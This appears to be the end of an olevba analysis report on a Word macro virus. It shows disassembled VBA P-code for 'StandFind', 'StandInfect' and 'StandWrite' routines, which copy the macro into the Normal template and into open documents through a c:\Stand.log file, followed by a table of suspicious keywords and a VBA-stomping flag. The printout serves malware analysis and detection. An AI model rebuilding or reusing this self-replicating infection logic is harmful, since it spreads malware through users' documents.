' 	ArgsMemCall InsertLines 0x0002 
' Line #177:
' 	EndIfBlock 
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0006 "'Stand"
' 	Eq 
' 	Ld Count 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Count 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Trim 0x0001 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Ge 
' 	And 
' 	IfBlock 
' Line #180:
' 	LitStr 0x0009 "Stand Yes"
' 	Ld Count 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	St StandFind 
' Line #181:
' 	ExitFunc 
' Line #182:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0006 "'Stand"
' 	Eq 
' 	Ld Count 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Count 
' 	LitDI2 0x0002 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Trim 0x0001 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Lt 
' 	And 
' 	ElseIfBlock 
' Line #183:
' 	GoTo FindIt 
' Line #184:
' 	ElseBlock 
' Line #185:
' 	Label FindIt 
' 	StartForVariable 
' 	Ld cnt 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #186:
' 	Ld cnt 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd LCase$ 0x0001 
' 	Ld StartM 
' 	ArgsLd LCase$ 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #187:
' 	StartForVariable 
' 	Ld cnt 
' 	EndForVariable 
' 	NextVar 
' Line #188:
' 	Ld cnt 
' 	St StandFind 
' Line #189:
' 	ExitFunc 
' Line #190:
' 	EndIfBlock 
' Line #191:
' 	EndIfBlock 
' Line #192:
' 	StartForVariable 
' 	Ld Count 
' 	EndForVariable 
' 	NextVar 
' Line #193:
' 	LitStr 0x0005 "Stand"
' 	St StandFind 
' Line #194:
' 	EndFunc 
' Line #195:
' Line #196:
' 	FuncDefn (Private Function StandInfect(id_FFFE As Variant))
' Line #197:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #198:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #199:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	LitStr 0x0013 "Private Sub Stand()"
' 	LitVarSpecial (True)
' 	ArgsLd StandFind 0x0003 
' 	LitStr 0x0005 "Stand"
' 	Eq 
' 	IfBlock 
' Line #200:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #201:
' 	LitVarSpecial (True)
' 	St flag 
' Line #202:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	LitStr 0x0013 "Private Sub Stand()"
' 	LitVarSpecial (True)
' 	ArgsLd StandFind 0x0003 
' 	LitStr 0x0005 "Stand"
' 	Eq 
' 	ElseIfBlock 
' Line #203:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #204:
' 	LitVarSpecial (True)
' 	St flag 
' Line #205:
' 	ElseBlock 
' Line #206:
' 	LitVarSpecial (False)
' 	St flag 
' Line #207:
' 	EndIfBlock 
' Line #208:
' 	Ld flag 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #209:
' 	LitStr 0x000C "c:\Stand.log"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #210:
' 	LitDI2 0x0002 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo cpyvir 
' 	EndIf 
' Line #211:
' 	LitDI2 0x0001 
' 	St Count 
' Line #212:
' 	LitDI2 0x0002 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #213:
' 	LitDI2 0x0002 
' 	Ld stress 
' 	LineInput 
' Line #214:
' 	Ld Count 
' 	Ld stress 
' 	Ld bry 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #215:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #216:
' 	Loop 
' Line #217:
' 	Label cpyvir 
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #218:
' 	EndIfBlock 
' Line #219:
' 	EndFunc 
' Line #220:
' Line #221:
' 	FuncDefn (Private Function StandWrite(StartM, id_FFFE As Variant))
' Line #222:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #223:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #224:
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Ld StartM 
' 	LitVarSpecial (False)
' 	ArgsLd StandFind 0x0003 
' 	St Count 
' Line #225:
' 	Ld Count 
' 	LitStr 0x0005 "Stand"
' 	Ne 
' 	IfBlock 
' Line #226:
' 	Ld Count 
' 	LitStr 0x0009 "Stand Yes"
' 	FnLen 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "Stand Yes"
' 	Eq 
' 	IfBlock 
' Line #227:
' 	Ld Count 
' 	Ld Count 
' 	FnLen 
' 	LitStr 0x0009 "Stand Yes"
' 	FnLen 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	St Count 
' Line #228:
' 	EndIfBlock 
' Line #229:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "End Function"
' 	Eq 
' 	Or 
' 	DoUnitil 
' Line #230:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St stress 
' Line #231:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld stress 
' 	PrintItemNL 
' Line #232:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Add 
' 	St Count 
' Line #233:
' 	Loop 
' Line #234:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' Line #235:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #236:
' 	EndIfBlock 
' Line #237:
' 	EndFunc 
' Line #238:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

